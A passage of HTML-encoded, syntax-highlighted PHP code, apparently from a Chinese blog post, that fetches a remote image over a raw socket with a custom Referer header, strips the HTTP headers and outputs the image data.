begin to fetch the image&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$stream&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;fsockopen&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;host&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;port&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$errno&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$errstr&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;timeout&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nif (!&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$stream&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;) die (&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;ERROR: $errno - $errstr\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;fputs&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$stream&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;buildHeaders&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;());&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;body&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nwhile (!&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;feof&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$stream&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;)) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;body&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;.=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;fgets&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$stream&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;4096&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;// extract picture data&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;extractBody&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;body&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;// send ''ContentType'' header for saving this file correctly&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n// 如果不发送CT，则在试图保存图片时，IE7 会发生错误 (800700de)&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n// Flock, Firefox 则没有这个问题，Opera 没有测试&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;header&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;Content-Type: $this-&amp;gt;contentType&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nprint&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;body&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;// save this picture&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n//&amp;nbsp;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;file_put_contents&lt;/b&gt;(''hello.jpg'', $this-&amp;gt;body);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/font&gt;&lt;/span&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;fclose&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$stream&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* Compose HTTP request header&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* @return string&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;private&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;buildHeaders&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;()&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;$this-&amp;gt;method $this-&amp;gt;path HTTP/1.1\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;.=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;Host: $this-&amp;gt;host\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;.=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;Content-Type: image/jpeg\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;.=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;Accept: */*\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;.=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;Keep-Alive: 300\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;.=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;Connection: close\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;.=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;Referer: $this-&amp;gt;referer\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;.=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;Cache-Control: max-age=315360000\\r\\n\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nreturn&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$request&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;;&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n}&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;/**&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* Strip initial header and filesize info&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n*/&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;private&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;function&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;extractBody&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$body&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;)&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;// The status of link&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;if(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;strpos&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$body&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;''200 OK''&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;) &amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;0&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;) {&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#ff8000;&quot;&gt;// strip header&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$endpos&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;strpos&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#0000bb;&quot;&gt;$body&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#dd0000;&quot;&gt;&quot;\\r\\n\\r\\n&quot;&lt;/span&gt;&lt;/font&gt;&lt;font face=&quot;新宋体 &quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;line-height:1.5em;&quot;&gt;&lt;span style=&quot;outline-style:none;outline-width:initial;outline-color:initial;color:#007700;&quot;&gt;);&amp;nbsp;&lt;br 